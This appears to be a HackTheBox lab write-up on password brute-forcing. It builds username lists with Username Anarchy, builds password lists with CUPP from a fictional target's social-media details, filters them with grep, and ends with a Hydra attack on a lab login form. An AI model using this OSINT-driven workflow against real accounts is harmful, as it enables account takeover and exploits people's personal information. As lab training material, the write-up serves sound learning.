# Custom Wordlists

## Username Anarchy

This is where `Username Anarchy` shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target's username:

```shell-session
eldeim@htb[/htb]$ ./username-anarchy -l

Plugin name             Example
--------------------------------------------------------------------------------
first                   anna
firstlast               annakey
first.last              anna.key
firstlast[8]            annakey
first[4]last[4]         annakey
firstl                  annak
f.last                  a.key
flast                   akey
lfirst                  kanna
l.first                 k.anna
lastf                   keya
last                    key
last.f                  key.a
last.first              key.anna
FLast                   AKey
first1                  anna0,anna1,anna2
fl                      ak
fmlast                  abkey
firstmiddlelast         annaboomkey
fml                     abk
FL                      AK
FirstLast               AnnaKey
First.Last              Anna.Key
Last                    Key
```

First, install ruby, and then pull the `Username Anarchy` git to get the script:

```shell-session
eldeim@htb[/htb]$ sudo apt install ruby -y
eldeim@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
eldeim@htb[/htb]$ cd username-anarchy
```

Next, execute it with the target's first and last names. This will generate possible username combinations.

```shell-session
eldeim@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Upon inspecting `jane_smith_usernames.txt`, you'll encounter a diverse array of usernames, encompassing:

* Basic combinations: `janesmith`, `smithjane`, `jane.smith`, `j.smith`, etc.
* Initials: `js`, `j.s.`, `s.j.`, etc.
* etc

This comprehensive list, tailored to the target's name, is valuable in a brute-force attack.

## CUPP

With the username aspect addressed, the next formidable hurdle in a brute-force attack is the password. This is where `CUPP` (Common User Passwords Profiler) steps in, a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target.

OSINT will be a goldmine of information for CUPP. Provide as much information as possible; CUPP's effectiveness hinges on the depth of your intelligence. For example, let's say you have put together this profile based on Jane Smith's Facebook postings.

| Field               | Details                      |
| ------------------- | ---------------------------- |
| Name                | Jane Smith                   |
| Nickname            | Janey                        |
| Birthdate           | December 11, 1990            |
| Relationship Status | In a relationship with Jim   |
| Partner's Name      | Jim (Nickname: Jimbo)        |
| Partner's Birthdate | December 12, 1990            |
| Pet                 | Spot                         |
| Company             | AHI                          |
| Interests           | Hackers, Pizza, Golf, Horses |
| Favorite Colors     | Blue                         |

CUPP will then take your inputs and create a comprehensive list of potential passwords:

* Original and Capitalized: `jane`, `Jane`
* Reversed Strings: `enaj`, `enaJ`
* Birthdate Variations: `jane1994`, `smith2708`
* Concatenations: `janesmith`, `smithjane`
* Appending Special Characters: `jane!`, `smith@`
* Appending Numbers: `jane123`, `smith2024`
* Leetspeak Substitutions: `j4n3`, `5m1th`
* Combined Mutations: `Jane1994!`, `smith2708@`

If you're using Pwnbox, CUPP is likely pre-installed. Otherwise, install it using:

```shell-session
eldeim@htb[/htb]$ sudo apt install cupp -y
```

Invoke CUPP in interactive mode, CUPP will guide you through a series of questions about your target, enter the following as prompted:

```shell-session
eldeim@htb[/htb]$ cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990


> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name: Spot
> Company name: AHI


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 46790 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```

We now have a generated username.txt list and jane.txt password list, but there is one more thing we need to deal with. CUPP has generated many possible passwords for us, but Jane's company, AHI, has a rather odd password policy.

* Minimum Length: 6 characters
* Must Include:
  * At least one uppercase letter
  * At least one lowercase letter
  * At least one number
  * At least two special characters (from the set `!@#$%^&*`)

As we did earlier, we can use grep to filter that password list to match that policy:

```shell-session
eldeim@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

This command efficiently filters `jane.txt` to match the provided policy, from \~46000 passwords to a possible \~7900

Use the two generated lists in Hydra against the target to brute-force the login form. Remember to change the target info for your instance.

```shell-session
eldeim@htb[/htb]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 11:47:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790), ~40942 tries per task
[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:Invalid credentials
[PORT][http-post-form] host: IP   login: ...   password: ...
[STATUS] attack finished for IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 11:47:18
```

### PoCs - Questions

* After successfully brute-forcing, and then logging into the target, what is the full flag you find?

I initialized cupp in interactive mode and filled Jane’s data. Then I grepped the wordlist to meet her company’s password requirements:

```
cupp -i [filled data] grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

* Minimum Length: 6 characters
* Must Include:
  * At least one uppercase letter
  * At least one lowercase letter
  * At least one number
  * At least two special characters (from the set `!@#$%^&*`)

Then I generated all possible usernames for Jane with username Anarchy:

```
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Then I performed the attack with Hydra:

```
hydra -L jane_smith_usernames.txt -P jane-filtered.txt 94.237.55.128 -s 57736 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```
